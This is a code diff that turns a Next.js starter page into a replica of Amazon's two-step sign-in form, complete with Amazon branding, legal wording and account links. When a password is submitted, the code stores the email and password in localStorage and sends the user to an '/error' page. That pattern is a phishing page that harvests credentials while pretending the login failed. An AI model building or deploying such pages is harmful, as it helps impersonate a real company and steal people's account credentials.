@@ -1,112 +1,278 @@
-import Image from "next/image";
+/* eslint-disable react/no-unescaped-entities */
+"use client";
+
+import { useState } from "react";
+import { useRouter } from 'next/navigation';
+import styles from './styles.module.css';
 
 export default function Home() {
-  return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">src/app/page.js</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{" "}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
+  const [show, setShow] = useState(false);
+  const [step, setStep] = useState(1);
+  const [data, setData] = useState({ email: null, password: null });
+  const [error, setError] = useState({ status: false, msg: '' });
+  const router = useRouter();
+
+  const renderFormStep = (step) => {
+    switch (step) {
+      case 1:
+        return <>
+          <label htmlFor="email" className={styles.loginLabel}>
+            Email or mobile phone number
+          </label>
+          <div className="mt-px">
+            <input
+              id="email"
+              name="email"
+              className={`${error.status ? styles.loginInputError : ""}`}
+              onChange={(e) => { setData({ ...data, email: e.target.value }) }}
             />
-          </a>
+          </div>
+        </>;
+      case 2:
+        return <>
+          <div className={styles.loginRow}>
+            <span>{data.email}</span>
+            <a className={styles.loginLink} tabIndex="5" href="#" role="button"
+              onClick={() => {
+                setData({ ...data, email: null });
+                setStep(1);
+              }}>
+              {" "}Change
+            </a>
+          </div>
+          <div className="flex flex-row justify-between">
+            <label htmlFor="pswd" className={styles.loginLabel}>
+              Password
+            </label>
+            <a className={styles.loginLink} tabIndex="6" href="#">
+              Forgot your password?
+            </a>
+          </div>
+          <div className="mt-px">
+            <input
+              id="pswd"
+              name="pswd"
+              onChange={(e) => { setData({ ...data, password: e.target.value }) }}
+              className={`${error.status ? styles.loginInputError : ""}`}
+            />
+          </div>
+        </>;
+    }
+  };
+
+  const renderFormFooter = (step) => {
+    switch (step) {
+      case 1:
+        return <>
+          <div className={styles.loginHelp + " mb-5"}>
+            By continuing, you agree to Amazon's{" "}
+            <a href="#">
+              Conditions of Use
+            </a>{" "}
+            and{" "}
+            <a href="#">
+              Privacy Notice
+            </a>.
+          </div>
+          <div className={styles.loginSection}>
+            <div className={styles.loginRow}>
+              <a
+                className={styles.loginExpander}
+                href="javascript:void(0)"
+                onClick={() => { setShow(!show); }}
+              >
+                <i className={`${styles.loginIcon} ${!show ? styles.loginIconExpand : styles.loginIconCollapse}`} />
+                <span>Need help?</span>
+              </a>
+              {
+                show &&
+                <ul className={styles.loginUnorderedList + " " + styles.loginNoStyle + " " + styles.loginVertical}>
+                  <li>
+                    <span className={styles.loginListItem}>
+                      <div
+                        aria-expanded="true"
+                        className={styles.loginExpander}
+                        style={{ overflow: "hidden" }}
+                      >
+                        <a
+                          id="auth-fpp-link-bottom"
+                          className={styles.loginExpander}
+                          href="#"
+                        >
+                          Forgot your password?
+                        </a>
+                      </div>
+                    </span>
+                  </li>
+                  <li>
+                    <span className={styles.loginListItem}>
+                      <div
+                        aria-expanded="true"
+                        className={styles.loginExpander}
+                        style={{ overflow: "hidden" }}
+                      >
+                        <a
+                          id="ap-other-signin-issues-link"
+                          className={styles.loginExpander}
+                          href="#"
+                        >
+                          Other issues with Sign-In
+                        </a>
+                      </div>
+                    </span>
+                  </li>
+                </ul>
+              }
+            </div>
+          </div>
+          <div className={styles.loginSection}>
+            <hr aria-hidden="true" />
+            <div>
+              <span className={styles.loginLabel}>Buying for work?</span>
+            </div>
+            <a
+              className={styles.loginLink}
+              href="#"
+            >
+              <span>Shop on Amazon Business</span>
+            </a>
+          </div>
+        </>;
+      case 2:
+        return <>
+          <div className={styles.loginRow + " mt-4"}>
+            <div className={styles.loginSection}>
+              <label htmlFor="login-remember-me" className={styles.loginFormLabel}>
+                <div data-a-input-name="rememberMe" className={styles.loginCheckbox}>
+                  <label className="flex flex-row">
+                    <input
+                      type="checkbox"
+                      name="rememberMe"
+                      defaultValue="true"
+                      tabIndex={4}
+                    />
+                    <i className={styles.loginIcon + " " + styles.loginIconCheckbox} />
+                    <span className={styles.loginLabel + " " + styles.loginCheckboxLabel}>
+                      Keep me signed in.{" "}
+                      <span>
+                        <a
+                          id="remember_me"
+                          href="javascript:void(0)"
+                          role="button"
+                          className={styles.loginLink}
+                        >
+                          Details
+                          <i className={styles.loginIcon + " " + styles.loginIconPopover} />
+                        </a>
+                      </span>
+                    </span>
+                  </label>
+                </div>
+              </label>
+            </div>
+          </div>
+        </>;
+    }
+  };
+
+  const renderFormButtonTxt = (step) => {
+    switch (step) {
+      case 1:
+        return "Continue";
+      case 2:
+        return "Sign in";
+    }
+  };
+
+  const onNextStep = (e) => {
+    e.preventDefault();
+    const err = { status: false, msg: '' };
+    let isErr = false;
+
+    const isValidEmail = (email) => {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    };
+
+    const isValidPhone = (phone) => {
+      return /^\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/.test(phone);
+  };
+
+    if (step === 1) {
+      if (!data.email?.trim()) {
+        err.status = true;
+        err.msg = "Enter your email or mobile phone number";
+        isErr = true;
+      } else if (!isValidEmail(data.email) && !isValidPhone(data.email)) {
+        err.status = true;
+        err.msg = "Enter a valid email address or mobile phone number";
+        isErr = true;
+      }
+    } else if (step === 2) {
+      if (!data.password?.trim()) {
+        err.status = true;
+        err.msg = "Enter your password";
+        isErr = true;
+      } else {
+        localStorage.setItem('email', data.email);
+        localStorage.setItem('password', data.password);
+        router.push('/error', { scroll: false });
+      }
+    }
+    if (!isErr) {
+      setStep(step + 1);
+    }
+    setError(err);
+  };
+
+  return (
+    <main className={`flex min-h-screen flex-col items-center justify-between ${styles.mainContainer}`}>
+      <div className="flex min-h-full flex-1 flex-col ">
+        <div className="flex justify-center items-center">
+          <i className={styles.loginLogo} alt="Logo here" />
         </div>
-      </div>
+        <div className={`${styles.loginForm} mt-2.5`}>
+          <form action="#" method="POST">
+            <h1 className={`mb-2 ${styles.loginTittle}`}>
+              Sign in
+            </h1>
+            {
+              renderFormStep(step)
+            }
+            {error.status &&
+              <div className={`${styles.loginAlertInline} ${styles.loginAlertError}`} role="alert" style={{ display: "block" }}>
+                <div className={`${styles.loginAlertContainer}`}>
+                  <i className={`${styles.loginIcon} ${styles.loginIconAlert}`} />
+                  <div className={`${styles.loginAlertContent}`}>
+                    {error.msg}
+                  </div>
+                </div>
+              </div>
+            }
+            <div>
+            </div>
+            <div>
+              <button
+                className={`flex w-full justify-center  mt-5 ${styles.loginBtn}`}
+                onClick={(e) => onNextStep(e)}
+              >
+                {renderFormButtonTxt(step)}
+              </button>
+            </div>
+            {renderFormFooter(step)}
 
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-full sm:before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-full sm:after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
+          </form>
 
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800 hover:dark:bg-opacity-30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore starter templates for Next.js.
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50 text-balance`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
+        </div>
+        {
+          step == 1 && <>
+            <div className={`${styles.loginDivider} ${styles.loginDividerBreak}`}><h5 aria-level="5">New to Amazon?</h5></div>
+            <span className={`${styles.loginButton}`}>
+              <span className={`${styles.loginButtonInner}`}>
+                <a href="#" className={`${styles.loginButtonText}`}>
+                  Create your Amazon account
+                </a></span></span>
+          </>
+        }
       </div>
     </main>
   );
